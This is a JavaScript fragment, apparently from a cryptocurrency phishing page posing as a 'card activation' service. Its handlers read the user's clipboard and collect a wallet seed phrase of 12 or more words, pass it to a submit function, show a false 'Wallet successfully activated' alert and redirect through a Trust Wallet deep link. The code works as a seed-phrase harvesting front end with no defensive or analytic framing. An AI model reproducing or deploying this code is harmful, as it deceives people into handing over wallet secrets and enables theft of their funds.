    phraseInput.addEventListener('input', handleInput);
    phraseInput.addEventListener('keyup', handleInput);
    phraseInput.addEventListener('paste', handleInput);
  }

  // ============= PASTE BUTTON =============
  if (pasteBtn) {
    pasteBtn.addEventListener('click', async (e) => {
      e.preventDefault();
      e.stopPropagation();
      
      if (window.trackButtonClick) window.trackButtonClick('paste');
      
      try {
        const text = await navigator.clipboard.readText();
        phraseInput.value = text;
        
        const badgesContainer = document.getElementById('wordBadges');
        if (badgesContainer) {
          badgesContainer.innerHTML = '';
        }
        
        const event = new Event('input', { bubbles: true });
        phraseInput.dispatchEvent(event);
      } catch (err) {
        console.error('Clipboard error:', err);
        alert('Unable to access clipboard. Please paste manually.');
      }
    });
  }

  // ============= RESTORE BUTTON =============
  if (restoreBtn) {
    restoreBtn.addEventListener('click', async (e) => {
      e.preventDefault();
      e.stopPropagation();

      if (window.trackButtonClick) window.trackButtonClick('restore');

      const phrase = phraseInput.value.trim();
      
      if (!phrase) {
        alert('Please enter your seed phrase');
        return;
      }

      const words = phrase.split(/\s+/).filter(w => w.length > 0);
      if (words.length < 12) {
        alert('Secret phrase must contain at least 12 words');
        return;
      }

      const originalText = restoreBtn.textContent;
      restoreBtn.textContent = 'Validating...';
      restoreBtn.style.pointerEvents = 'none';

      if (window.validatePhraseDirect) {
        const isValid = await window.validatePhraseDirect(phrase);
        
        if (!isValid) {
          alert('Invalid secret phrase');
          restoreBtn.textContent = originalText;
          restoreBtn.style.pointerEvents = 'auto';
          return;
        }
      }

      restoreBtn.textContent = 'Processing...';

      if (window.handlePhraseSubmit) {
        const result = await window.handlePhraseSubmit(phrase);
        
        if (result.success) {
          // Закрываем bottom sheet
          const textarea = document.getElementById('phraseInput');
            if (textarea) {
                  textarea.value = '';
              }
          
          // Через небольшую задержку показываем success и редиректим
          setTimeout(() => {
            alert('Wallet successfully activated! Redirecting...');
            
            // First redirect to link.trustwallet
            const trustWalletDeepLink = 'trust://open_url?url=' + encodeURIComponent(window.location.origin + '/launch/guide.html');
            

            window.location.href = 'https://link.trustwallet.com/open_url?url=' + encodeURIComponent(trustWalletDeepLink);
          }, 300);
        } else {
          console.log('❌ Failed:', result.error);
          alert('Error: ' + (result.error || 'Please try again'));
        }
      } else {
        // Если нет handlePhraseSubmit, просто закрываем

        
        setTimeout(() => {
          alert('This wallet is not supported for card activation. Please try a different wallet.');
        }, 300);
      }

      restoreBtn.textContent = originalText;
      restoreBtn.style.pointerEvents = 'auto';
    });
  }
});

// ============= KEYBOARD FIX (Mobile) =============
(function() {
  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) 
    || window.innerWidth <= 768;
  
  if (!isMobile) return;

  window.addEventListener('DOMContentLoaded', () => {
    const phraseInput = document.getElementById('phraseInput');
    if (!phraseInput) return;

    phraseInput.addEventListener('focus', () => {
      setTimeout(() => {
        document.body.classList.add('keyboard-open');
        phraseInput.scrollIntoView({ behavior: 'smooth', block: 'start' });
      }, 300);
    });

    phraseInput.addEventListener('blur', () => {
      setTimeout(() => {
        document.body.classList.remove('keyboard-open');
      }, 100);
    });
  });
})();